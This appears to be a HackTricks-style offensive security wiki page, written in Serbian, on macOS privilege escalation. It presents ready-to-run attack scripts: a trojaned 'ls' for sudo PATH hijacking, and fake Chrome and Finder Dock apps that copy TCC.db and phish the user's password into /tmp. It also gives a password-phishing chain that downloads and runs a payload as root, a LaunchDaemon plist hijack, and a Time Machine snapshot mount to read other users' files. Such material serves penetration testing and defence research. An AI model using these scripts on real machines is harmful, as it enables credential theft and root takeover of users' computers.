# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ako ste ovde došli u potrazi za TCC privilege escalation, idite na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Imajte na umu da **većina trikova o privilege escalation koji utiču na Linux/Unix će takođe uticati i na MacOS** mašine. Dakle, pogledajte:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## User Interaction

### Sudo Hijacking

Originalnu [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) možete pronaći.

Međutim, macOS **zadržava** korisnikov **`PATH`** kada on izvršava **`sudo`**. To znači da bi drugi način da se izvede ovaj napad bio da **hijack other binaries** koje će žrtva izvršiti prilikom **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Imajte na umu da korisnik koji koristi terminal gotovo sigurno ima instaliran **Homebrew**. Zbog toga je moguće hijack-ovati binarne fajlove u **`/opt/homebrew/bin`**.

### Dock Impersonation

Korišćenjem neke **social engineering** tehnike mogli biste, na primer, **impersonate Google Chrome** unutar Dock-a i zapravo izvršiti sopstveni skript:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Neki predlozi:

- Proverite u Dock-u da li postoji Chrome, i u tom slučaju **uklonite** taj unos i **dodajte** **lažni** **Chrome entry in the same position** u Dock nizu.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Neki predlozi:

- Ne možete **ukloniti Finder iz Dock-a**, pa ako ćete ga dodati u Dock, možete postaviti lažni Finder odmah pored pravog. Za ovo morate **dodati unos za lažni Finder na početak Dock niza**.
- Druga opcija je da ga ne postavljate u Dock, već da ga samo otvorite; "Finder traži da kontroliše Finder" nije toliko čudno.
- Još jedna opcija da **escalate to root without asking** lozinku putem ružnog prozora je naterati Finder da zaista zatraži lozinku kako bi izvršio privilegovanu radnju:
- Naterajte Finder da kopira u **`/etc/pam.d`** novu **`sudo`** datoteku (prompt koji traži lozinku će naznačiti da "Finder želi da kopira sudo")
- Naterajte Finder da kopira novi **Authorization Plugin** (Možete kontrolisati ime fajla tako da prompt za lozinku pokaže da "Finder želi da kopira Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware često zloupotrebljava interakciju korisnika da **presretne lozinku koja omogućava sudo** i ponovo je koristi programatski. Uobičajeni tok:

1. Identifikuj prijavljenog korisnika pomoću `whoami`.
2. **Ponavljaj upite za lozinku** dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
3. Sačuvaj kredencijal (npr. `/tmp/.pass`) i izvršavaj privilegovane radnje sa `sudo -S` (lozinka preko stdin).

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ukradena lozinka se potom može ponovo iskoristiti da **očisti Gatekeeper quarantine pomoću `xattr -c`**, kopira LaunchDaemons ili druge privilegovane fajlove i pokrene dodatne faze neinteraktivno.

## Noviji macOS-specifični vektori (2023–2025)

### Zastarelo `AuthorizationExecuteWithPrivileges` i dalje upotrebljivo

`AuthorizationExecuteWithPrivileges` je zastarelo u 10.7, ali **još uvek radi na Sonoma/Sequoia**. Mnogi komercijalni programi za ažuriranje pozivaju `/usr/libexec/security_authtrampoline` sa nepouzdanim putem. Ako je ciljna binarna datoteka upisiva od strane korisnika, možete postaviti trojana i iskoristiti legitimni prompt:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombinujte sa **masquerading tricks above** da prikažete uverljiv dijalog za lozinku.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Ako je LaunchDaemon plist ili njegov cilj `ProgramArguments` **user-writable**, možete eskalirati zamenom iste i prisilnim ponovnim učitavanjem launchd-a:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Ovo odražava obrazac exploita objavljen za **CVE-2025-24085**, gde je writable plist zloupotrebljen da bi se izvršio napadačev kod kao root.

### XNU SMR credential race (CVE-2025-24118)

Utrka u `kauth_cred_proc_update` omogućava lokalnom napadaču da korumpira read-only credential pointer (`proc_ro.p_ucred`) tako što pokreće `setgid()`/`getgid()` petlje preko više threadova dok ne dođe do torn `memcpy`. Uspešna korupcija daje **uid 0** i pristup kernel memoriji. Minimalna struktura PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Uparite sa heap grooming da postavite kontrolisane podatke tamo gde se pointer ponovo čita. Na ranjivim buildovima ovo je pouzdan **local kernel privesc** bez potrebe za SIP bypass-om.

### SIP bypass preko Migration Assistant ("Migraine", CVE-2023-32369)

Ako već imate root, SIP i dalje blokira upise u sistemske lokacije. Bag **Migraine** zloupotrebljava Migration Assistant entitlement `com.apple.rootless.install.heritable` da pokrene child process koji nasleđuje SIP bypass i prepisuje zaštićene putanje (npr. `/System/Library/LaunchDaemons`). Lanac:

1. Dobijte root na aktivnom sistemu.
2. Okidajte `systemmigrationd` sa crafted state-om da izvrši binarni fajl pod kontrolom napadača.
3. Iskoristite nasleđeni entitlement da izmenite SIP-zaštićene fajlove, što ostaje čak i posle reboot-a.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Više Apple daemona prihvata **NSPredicate** objekte preko XPC i validira samo polje `expressionType`, koje je kontrolisano od strane napadača. Kreiranjem predicate-a koji evaluira proizvoljne selektore možete postići **code execution in root/system XPC services** (npr. `coreduetd`, `contextstored`). U kombinaciji sa inicijalnim app sandbox escape-om, ovo omogućava **privilege escalation without user prompts**. Potražite XPC endpoint-e koji deserializuju predicate i nemaju robustan visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (čak i neprivilegovani) može kreirati i mount-ovati Time Machine snapshot i **access ALL the files** tog snapshot-a.\
Jedina privilegija koja je potrebna jeste da aplikacija koja se koristi (npr. `Terminal`) ima **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), što mora dodeliti administrator.

<details>
<summary>Mount Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Detaljnije objašnjenje može se [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.

## Osetljive informacije

Ovo može biti korisno za eskalaciju privilegija:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Reference

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
